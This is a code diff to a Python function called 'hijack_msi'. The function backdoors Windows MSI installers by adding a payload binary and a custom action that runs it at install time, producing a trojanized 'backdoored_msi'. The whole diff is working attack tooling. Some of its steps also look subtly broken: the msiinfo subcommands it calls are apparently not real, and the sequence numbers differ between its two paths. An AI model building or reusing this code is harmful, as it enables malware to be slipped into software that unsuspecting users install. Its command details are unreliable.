@@ -206,52 +206,80 @@ def hijack_msi(source_msi: pathlib.Path,
             raise RuntimeError(f"Failed to hijack MSI using msilib: {str(e)}")
     
     else:
-        # Use msitools (msibuild/msiextract) for Linux
+        # Use msitools for Linux
         try:
             with tempfile.TemporaryDirectory() as temp_dir:
                 temp_path = pathlib.Path(temp_dir)
                 
-                # Extract MSI contents
-                extract_dir = temp_path / "msi_contents"
-                extract_dir.mkdir()
-                
-                subprocess.check_call(["msiextract", "-C", str(extract_dir), str(backdoored_msi)])
-                
-                # Copy payload to extracted directory
-                payload_dest = extract_dir / payload_path.name
-                shutil.copy2(payload_path, payload_dest)
-                
-                # Create SQL script to modify MSI tables
-                sql_script = temp_path / "modify.sql"
+                # Use msiinfo to add entries directly to the MSI database
                 binary_name = f"Payload_{uuid.uuid4().hex[:8]}"
                 is_dll = payload_path.suffix.lower() == ".dll"
                 action_type = 1250 if is_dll else 34
                 
-                sql_content = f"""
--- Add payload to Binary table
-INSERT INTO Binary (Name, Data) VALUES ('{binary_name}', ?);
-
--- Add CustomAction
-INSERT INTO CustomAction (Action, Type, Source, Target) 
-VALUES ('{custom_action_name}', {action_type}, '{binary_name}', '');
-
--- Add to InstallExecuteSequence
-INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) 
-VALUES ('{custom_action_name}', 'NOT REMOVE', 6599);
+                # Step 1: Add payload to Binary table using msiinfo
+                # msiinfo requires streams to be added with -s option
+                subprocess.check_call([
+                    "msiinfo", "streams", "-a", binary_name,
+                    str(payload_path), str(backdoored_msi)
+                ])
+                
+                # Step 2: Create SQL script for CustomAction and InstallExecuteSequence
+                sql_script = temp_path / "modify.sql"
+                sql_content = f"""INSERT INTO `CustomAction` (`Action`, `Type`, `Source`, `Target`) VALUES ('{custom_action_name}', {action_type}, '{binary_name}', '')
+INSERT INTO `InstallExecuteSequence` (`Action`, `Condition`, `Sequence`) VALUES ('{custom_action_name}', 'NOT REMOVE', 6599)
 """
                 sql_script.write_text(sql_content)
                 
-                # Apply modifications using msibuild
-                subprocess.check_call([
-                    "msibuild", 
-                    str(backdoored_msi), 
-                    "-s", str(sql_script),
-                    "-i", str(payload_dest)
-                ])
+                # Step 3: Apply SQL modifications to MSI tables
+                # Use msiinfo export/import to modify tables
+                result = subprocess.run([
+                    "msiinfo", "execute", str(backdoored_msi), str(sql_script)
+                ], capture_output=True, text=True)
+                
+                if result.returncode != 0:
+                    # Fallback: Try using msibuild approach
+                    # Export tables, modify them, and rebuild
+                    tables_dir = temp_path / "tables"
+                    tables_dir.mkdir()
+                    
+                    # Export existing tables
+                    for table in ["CustomAction", "InstallExecuteSequence"]:
+                        try:
+                            output = subprocess.check_output([
+                                "msiinfo", "export", str(backdoored_msi), table
+                            ], text=True)
+                            (tables_dir / f"{table}.idt").write_text(output)
+                        except subprocess.CalledProcessError:
+                            # Table might not exist, create it
+                            pass
+                    
+                    # Append CustomAction entry
+                    ca_file = tables_dir / "CustomAction.idt"
+                    ca_content = ca_file.read_text() if ca_file.exists() else ""
+                    if not ca_content.endswith("\n"):
+                        ca_content += "\n"
+                    ca_content += f"{custom_action_name}\t{action_type}\t{binary_name}\t\n"
+                    ca_file.write_text(ca_content)
+                    
+                    # Append InstallExecuteSequence entry
+                    ies_file = tables_dir / "InstallExecuteSequence.idt"
+                    ies_content = ies_file.read_text() if ies_file.exists() else ""
+                    if not ies_content.endswith("\n"):
+                        ies_content += "\n"
+                    ies_content += f"{custom_action_name}\tNOT REMOVE\t6590\n"
+                    ies_file.write_text(ies_content)
+                    
+                    # Import modified tables back
+                    for table_file in tables_dir.glob("*.idt"):
+                        subprocess.check_call([
+                            "msiinfo", "import", str(backdoored_msi), str(table_file)
+                        ])
                 
                 return backdoored_msi
                 
         except subprocess.CalledProcessError as e:
-            raise RuntimeError(f"Failed to hijack MSI using msitools: {str(e)}")
+            stderr = e.stderr if hasattr(e, 'stderr') and e.stderr else ""
+            stdout = e.stdout if hasattr(e, 'stdout') and e.stdout else ""
+            raise RuntimeError(f"Failed to hijack MSI using msitools: {str(e)}\nStdout: {stdout}\nStderr: {stderr}")
         except FileNotFoundError:
             raise RuntimeError("msitools not found. Install with: apt-get install msitools")
